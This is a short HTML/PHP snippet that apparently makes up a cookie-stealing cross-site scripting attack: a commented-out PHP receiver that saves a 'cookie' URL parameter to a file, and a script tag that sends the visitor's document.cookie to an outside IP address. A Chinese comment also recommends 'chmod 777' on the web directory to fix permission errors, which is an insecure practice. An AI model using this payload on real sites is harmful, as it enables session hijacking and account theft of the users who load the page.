<!-- <?php
if(isset($_GET["cookie"]))
    {
        $f=$_GET["cookie"];
        $cfile = fopen("cookiefile", "w");
        fwrite($cfile, $f."\n");
        fclose($cfile);
        echo $f;
    }
?> -->
<!-- php 没有权限解决办法：chmod 777 www -->


<script>window.open('http://104.131.23.191/index.php?cookie='+document.cookie)</script>
